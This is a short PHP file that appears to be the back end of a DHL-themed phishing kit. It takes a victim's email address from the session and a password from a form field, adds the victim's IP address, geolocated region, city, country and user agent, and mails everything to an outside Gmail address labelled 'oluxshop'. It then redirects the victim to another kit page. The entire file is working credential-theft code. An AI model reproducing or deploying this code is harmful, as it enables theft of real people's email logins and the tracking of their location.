<?php

session_start();
require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();

$geoplugin->locate();
$ip = getenv("REMOTE_ADDR");
$region = $geoplugin->region;
$city = $geoplugin->city;
$country = $geoplugin->countryName;

$userid = trim($_SESSION['login_user']);
$password = trim($_POST['person2']);

$ip = getenv("REMOTE_ADDR");
$message .= "EmalAcess: ".$userid."\n";
$message .= "EmalPass: ".$password."\n";
$message .= "IP : ".$ip."\n";
$message .= "Region : ".$region."\n";
$message .= "City : ".$city."\n";
$message .= "Country : ".$country."\n";
$message .= "User Agent: ".$_SERVER['HTTP_USER_AGENT']."\n";
$send = "oluxshop@gmail..com";
$subject = "DHL oluxshop";
$headers = "From: oluxshop";
mail($send,$subject,$message,$headers);
header("Location: db3.php");

?>